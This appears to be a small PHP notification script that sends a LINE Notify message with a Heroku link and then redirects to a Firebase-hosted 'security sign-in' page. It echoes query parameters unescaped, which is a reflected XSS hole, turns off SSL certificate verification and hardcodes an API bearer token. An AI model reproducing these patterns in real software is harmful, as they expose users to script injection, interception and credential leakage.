<?php

//echo 'Confrim => ';
$ip = $_GET['ip'];
$status = $_GET['status'];
echo $ip;
echo $status;

$Token = 'MqiNfilS7zUZdGB7Abh4MFRmx5Rzn4pVr6LzB5sJoNg';
$message = 'https://shielded-temple-38831.herokuapp.com/admin_security.html';

line_notify($Token, $message);

function line_notify($Token, $message)
{
   $lineapi = $Token; // ใส่ token key ที่ได้มา
	$mms =  trim($message); // ข้อความที่ต้องการส่ง
	date_default_timezone_set("Asia/Bangkok");
	$chOne = curl_init(); 
	curl_setopt( $chOne, CURLOPT_URL, "https://notify-api.line.me/api/notify"); 
	// SSL USE 
	curl_setopt( $chOne, CURLOPT_SSL_VERIFYHOST, 0); 
	curl_setopt( $chOne, CURLOPT_SSL_VERIFYPEER, 0); 
	//POST 
	curl_setopt( $chOne, CURLOPT_POST, 1); 
	curl_setopt( $chOne, CURLOPT_POSTFIELDS, "message=$mms"); 
	curl_setopt( $chOne, CURLOPT_FOLLOWLOCATION, 1); 
	$headers = array( 'Content-type: application/x-www-form-urlencoded', 'Authorization: Bearer '.$lineapi.'', );
        curl_setopt($chOne, CURLOPT_HTTPHEADER, $headers); 
	curl_setopt( $chOne, CURLOPT_RETURNTRANSFER, 1); 
	$result = curl_exec( $chOne ); 
	//Check error 
	if(curl_error($chOne)) 
	{ 
           echo 'error:' . curl_error($chOne); 
	} 
	else { 
	$result_ = json_decode($result, true); 
	   echo "status : ".$result_['status']; echo "message : ". $result_['message'];
	   header("Location: https://natha-e4e83.firebaseapp.com/security_sigin.html");
        } 
	curl_close( $chOne );   
}
